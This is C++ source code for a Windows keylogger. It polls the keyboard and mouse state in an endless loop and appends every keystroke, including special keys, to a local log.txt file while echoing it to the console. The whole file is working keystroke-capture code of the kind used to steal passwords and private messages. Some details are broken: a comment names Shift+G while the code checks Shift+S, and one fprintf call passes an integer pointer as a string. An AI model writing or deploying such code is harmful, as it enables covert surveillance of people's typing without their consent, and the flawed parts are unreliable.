#include <iostream>
#include <windows.h>

#define _KEY_PRESSED -32767 // The value returned by GetAsyncKeyState() if the key we're checking is pressed

using namespace std;

void log_into_file(int value)
{
    	if (GetAsyncKeyState(VK_SHIFT) & 0x8000 && GetAsyncKeyState('S') & 0x8000)
    	{
        	// Shift + G has been pressed, exit the program
        	exit(0);
    	}

	FILE *log_file;
	log_file = fopen("log.txt", "a");

	if (value == VK_SHIFT) {
        	cout << "[SHIFT]" << endl;
        	fprintf(log_file, "%s", "\n[SHIFT]");
    	}
    	else if (value == VK_RETURN) {
        	cout << "[RETURN]" << endl;
        	fprintf(log_file, "%s", "\n[RETURN]");
    	}
    	else if (value == VK_BACK) {
        	cout << "[BACK_SPACE]" << endl;
        	fprintf(log_file, "%s", "\n[BACK_SPACE]");
    	}
	else if (value == VK_SPACE) {
        	cout << "[SPACE_BAR]" << endl;
        	fprintf(log_file, "%s", "\n[SPACE_BAR]");
    	}    
	else if (value == VK_ESCAPE) {
        	cout << "[ESCAPE]" << endl;
        	fprintf(log_file, "%s", "\n[ESCAPE]");
    	}
    	else if (value == VK_CONTROL) {
        	cout << "[CTRL]" << endl;
        	fprintf(log_file, "%s", "\n[CTRL]");
    	}
    	else if (value == VK_CAPITAL) {
        	cout << "[CAPS_LOCK]" << endl;
        	fprintf(log_file, "%s", "\n[CAPS_LOCK]");
    	}
    	else if (value == VK_LBUTTON) {
        	cout << "[LEFT_MOUSE]" << endl;
        	fprintf(log_file, "%s", "\n[LEFT_MOUSE]");
    	}
	else if (value == VK_RBUTTON) {
		cout << "[RIGHT_MOUSE]" << endl;
		fprintf(log_file, "%s", "\n[RIGHT_MOUSE]");
    	}
    	else if (value == VK_MENU) {
        	cout << "[ALT]" << endl;
        	fprintf(log_file, "%s", "\n[ALT]");
    	}
    	else if (value == VK_TAB) {
        	cout << "[TAB]" << endl;
        	fprintf(log_file, "%s", "\n[TAB]");
    	}
    	else if (value == VK_LEFT) {
        	cout << "[ARROW_LEFT]" << endl;
        	fprintf(log_file, "%s", "\n[ARROW_LEFT]");
    	}
    	else if (value == VK_RIGHT) {
        	cout << "[ARROW_RIGHT]" << endl;
        	fprintf(log_file, "%s", "\n[ARROW_RIGHT]");
    	}
   	else if (value == VK_UP) {
        	cout << "[ARROW_UP]" << endl;
        	fprintf(log_file, "%s", "\n[ARROW_UP]");
    	}
    	else if (value == VK_DOWN) {
        	cout << "[ARROW_DOWN]" << endl;
        	fprintf(log_file, "%s", "\n[ARROW_DOWN]");
    	}
    	else {
        	cout << static_cast<char>(value);
        	fprintf(log_file, "%s", &value);
    	}

	fclose(log_file);
}

int main()
{
	int i;
	while (true) {	
		for (i = 8; i <= 255; i++) // https://www.thepcmanwebsite.com/ascii-chart.shtml
		{
			if (GetAsyncKeyState(i) != _KEY_PRESSED) continue;
			log_into_file(i);
		}
	}
}
